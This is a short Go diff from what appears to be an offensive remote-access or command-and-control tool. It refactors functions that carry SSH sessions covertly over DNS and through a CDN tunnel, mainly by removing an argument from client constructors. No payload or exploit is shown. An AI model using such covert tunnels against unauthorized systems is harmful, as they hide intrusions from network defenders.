@@ -272,7 +272,7 @@ func proxyDNSAlt(sshConfig *ssh.ClientConfig, id string) (*ssh.Client, net.Conn)
 		return nil, nil
 	}
 
-	dnsClient, err := blind.NewDNSClient(config.Get().DNSServer(), config.Get().DNSDomainAlt(), true, "ssh", config.Get().ID)
+	dnsClient, err := blind.NewDNSClient(config.Get().DNSServer(), config.Get().DNSDomainAlt(), "ssh", config.Get().ID)
 	if err != nil {
 		log.Error().Str("Mode", "DNSSH").Err(err).Msg("Failed to init SSH stream over DNS")
 
@@ -282,8 +282,8 @@ func proxyDNSAlt(sshConfig *ssh.ClientConfig, id string) (*ssh.Client, net.Conn)
 	go dnsClient.Tunnel(conn1)
 	log.Debug().Str("Mode", "DNSSH").Msg("Trying to mount SSH over the DNS connection")
 	// Write S tag to inform the incoming SSH traffic
-	//_, err = conn2.Write([]byte{'S'})
-	//if err != nil {
+	// _, err = conn2.Write([]byte{'S'})
+	// if err != nil {
 	//	log.Error().Str("Mode", "DNSSH").Err(err).Msg("Failed to init SSH stream over DNS")
 	//
 	//	return nil, nil
@@ -331,17 +331,7 @@ func proxyDNS(sshConfig *ssh.ClientConfig, dnsTransport *transport.DNSSH, id str
 
 func proxyDarkflare(ctx context.Context, sshConfig *ssh.ClientConfig, id string) (*ssh.Client, net.Conn) {
 	conn1, conn2 := net.Pipe()
-	httpClient := darkflare.NewClient(
-		config.Get().CDNURL(config.Get().ID),
-		80,
-		"http",
-		config.Get().CDNURL(config.Get().ID),
-		true,
-		"",
-		"",
-		"",
-		true,
-	)
+	httpClient := darkflare.NewClient(config.Get().CDNURL(config.Get().ID), 80, "http", config.Get().CDNURL(config.Get().ID), true, "", "", "")
 	go httpClient.HandleConnection(conn1, ctx)
 	client, err := tryProxySSH(sshConfig, conn2, id)
 	if err != nil {
